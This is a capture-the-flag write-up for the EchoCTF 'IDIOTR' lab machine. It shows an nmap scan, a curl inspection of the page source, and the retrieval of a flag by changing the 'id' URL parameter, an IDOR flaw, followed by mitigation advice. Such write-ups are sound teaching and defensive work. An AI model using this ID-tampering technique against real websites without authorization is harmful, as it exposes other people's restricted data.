# **IDIOTR**

![idiotr1](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/IDIOTR/idiotr1.png)

## **Introduction**

The **IDIOTR** machine from **EchoCTF** presents a web challenge that hides a single flag, which can be obtained by exploiting an **IDOR (Insecure Direct Object References)** vulnerability. This type of vulnerability allows access to restricted resources by manipulating URL parameters.

**IP:** `10.0.41.2`

---

## **Reconnaissance and Scanning**

We began reconnaissance on the **IDIOTR** machine using **Nmap**. The command used was:

```bash
nmap -sSC -vv -p- 10.0.41.2
```

**Result:**
```
PORT     STATE SERVICE REASON
1337/tcp open  waste   syn-ack ttl 63
```

Port **1337** is open. When connecting to IP `10.0.41.2` on that port via HTTP, we get a simple webpage with a navigation menu containing sections like *Home*, *About*, *Blogs*, and *Secret*.

![iditr2](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/IDIOTR/idiotr2.png)

---

## **Source Code Inspection**

We used `curl` to check the source code of the website from the terminal:

```bash
curl http://10.0.41.2:1337/
```

In the source, we see this navigation structure:

```html
<a class="nav-link" href="/">Home</a>
<li class="nav-item active">
  <a class="nav-link" href="/?id=2">About</a>
</li>
<li class="nav-item active">
  <a class="nav-link" href="/?id=3">Blogs</a>
</li>
<li class="nav-item active">
  <a class="nav-link" href="/?id=4">Secret</a>
</li>
```

This shows the site uses the `id` parameter to display content, which is a typical sign of an **IDOR**. The listed IDs go from `2` to `4`.

---

## **IDOR Exploitation**

We attempted to locate the flag by using `curl` and `grep` to search for the "ETSCTF" pattern:

```bash
curl http://10.0.41.2:1337/?id=4 | grep "ETSCTF"
```

After trying `id=2` through `id=4` with no success, we tested `id=1`:

```bash
curl http://10.0.41.2:1337/?id=1 | grep "ETSCTF"
```

**Response:**
``` shell 
<p>Now You know why its called Insecure Direct Object Reference ETSCTF_:DDDDDDDDDDDDDDDDDDDDDD</p>
```

This confirms the `id` parameter is not properly validated and allows access to sensitive data.

---

## **Vulnerability Identification**

The vulnerability identified is **IDOR (Insecure Direct Object Reference)**. It occurs when applications allow access to internal objects by manipulating parameters (like `id=1`, `id=2`, etc.) without verifying user permissions.

This enables attackers to obtain unauthorized access to sensitive content just by guessing or modifying the values.

---

## **Mitigation Measures**

To prevent IDOR vulnerabilities, the following best practices should be applied:

- **Object-level access control:** Always check if the user is authorized to access a resource, even if the request seems valid.

- **Parameter validation:** All URL parameters must be strictly validated before use.

- **Unpredictable identifiers:** Avoid sequential IDs. Use UUIDs or other non-guessable schemes.

- **Logging and alerts:** Monitor access to sensitive parameters and alert on suspicious access patterns, such as probing multiple IDs.
